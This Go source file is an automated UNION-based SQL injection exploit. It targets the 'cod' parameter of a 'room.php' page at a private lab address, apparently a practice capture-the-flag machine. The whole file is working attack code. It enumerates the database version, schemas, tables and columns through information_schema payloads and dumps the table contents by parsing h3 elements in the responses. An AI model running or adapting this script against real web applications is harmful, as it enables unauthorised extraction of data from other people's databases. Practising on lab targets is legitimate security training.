package main

import (
	"fmt"
	"io"
	"net/http"
	"strings"

	"golang.org/x/net/html"
)

type Exploit struct {
	Url          string
	Table_Schema string
	Table_Name   string
}

func (e *Exploit) enumerateDatabase(payload string) (bool, string) {
	payload = strings.ReplaceAll(payload, " ", "%20")
	fmt.Printf("[+] Payload: %s\n", payload)

	sqliURL := fmt.Sprintf("%s%s", e.Url, payload)
	resp, err := http.Get(sqliURL)
	if err != nil {
		fmt.Printf("[-] HTTP request failed for: %s\n", err)
		return false, ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Failed to read the response body: %s\n", err)
		return false, ""
	}

	payloadResult := parseHTMLForH3(string(body))
	if payloadResult == "" {
		fmt.Println("[-] No result :(")
		return false, ""
	}
	return true, payloadResult
}

func parseHTMLForH3(htmlContent string) string {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		fmt.Printf("[-] Failed to parse HTML: %s", err)
		return ""
	}

	var traverse func(*html.Node) string
	traverse = func(node *html.Node) string {
		if node.Type == html.ElementNode && node.Data == "h3" && node.FirstChild != nil {
			if node.FirstChild.Type == html.ElementNode && node.FirstChild.Data == "a" && node.FirstChild.FirstChild != nil {
				return node.FirstChild.FirstChild.Data
			} else if node.FirstChild.Type == html.TextNode {
				return node.FirstChild.Data
			}
		}

		for child := node.FirstChild; child != nil; child = child.NextSibling {
			res := traverse(child)
			if res != "" {
				return res
			}
		}
		return ""
	}

	return traverse(doc)
}

func versionExploit(exploit *Exploit) {
	fmt.Println("[+] Version Exploit --------------------------------------------------------------------------------------")
	payload := "7 UNION ALL SELECT 1,@@version,3,4,5,6,7; -- -"
	success, result := exploit.enumerateDatabase(payload)
	if !success {
		fmt.Println("[-] Exploit failed!.... Abort")
		return
	}
	fmt.Printf("[+] Exploit result: %s \n", result)
}

func schemaExploit(exploit *Exploit) {
	fmt.Println("[+] Schema Exploit --------------------------------------------------------------------------------------")
	offsets := make([]int, 100)

	for offset := range offsets {
		payload := fmt.Sprintf("7 UNION ALL SELECT 1,schema_name,3,4,5,6,7 FROM information_schema.schemata LIMIT 1 OFFSET %d; -- -", offset)
		success, result := exploit.enumerateDatabase(payload)
		if !success {
			fmt.Println("[-] Exploit failed!.... Abort")
			return
		}

		if result == "hotel" {
			exploit.Table_Schema = result
		}

		fmt.Printf("[+] Exploit result: %s \n", result)
	}
}

func tableExploit(exploit *Exploit) {
	fmt.Println("[+] Tables Exploit --------------------------------------------------------------------------------------")
	offsets := make([]int, 100)

	for offset := range offsets {
		payload := fmt.Sprintf("7 UNION ALL SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema='%s' LIMIT 1 OFFSET %d; -- -", exploit.Table_Schema, offset)
		success, result := exploit.enumerateDatabase(payload)
		if !success {
			fmt.Println("[-] Exploit failed!.... Abort")
			return
		}

		if result == "room" {
			exploit.Table_Name = result
		}

		fmt.Printf("[+] Exploit result: %s \n", result)
	}
}

func columnExploit(exploit *Exploit) {
	fmt.Println("[+] Columns Exploit --------------------------------------------------------------------------------------")
	offsets := make([]int, 100)

	for offset := range offsets {
		payload := fmt.Sprintf("7 UNION ALL SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='%s' LIMIT 1 OFFSET %d; -- -", exploit.Table_Name, offset)
		success, result := exploit.enumerateDatabase(payload)
		if !success {
			fmt.Println("[-] Exploit failed!.... Abort")
			return
		}
		fmt.Printf("[+] Exploit result: %s \n", result)
	}
}

func dataExploit(exploit *Exploit) {
	fmt.Println("[+] Data Exploit --------------------------------------------------------------------------------------")
	offsets := make([]int, 100)

	for offset := range offsets {
		payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(cod,0x7c,name,0x7c,price,0x7c,descrip,0x7c,star,0x7c,image,0x7c,mini),3,4,5,6,7 FROM %s LIMIT 1 OFFSET %d; -- -", exploit.Table_Name, offset)
		success, result := exploit.enumerateDatabase(payload)
		if !success {
			fmt.Println("[-] Exploit failed!.... Abort")
			return
		}
		fmt.Printf("[+] Exploit result: %s \n", result)
	}
}

func main() {
	url := "http://10.10.10.143/room.php?cod="
	exploit := Exploit{
		Url: url,
	}

	exploitsFunc := []func(*Exploit){
		versionExploit,
		schemaExploit,
		tableExploit,
		columnExploit,
		dataExploit,
	}

	for _, exploitFunc := range exploitsFunc {
		exploitFunc(&exploit)
	}
}
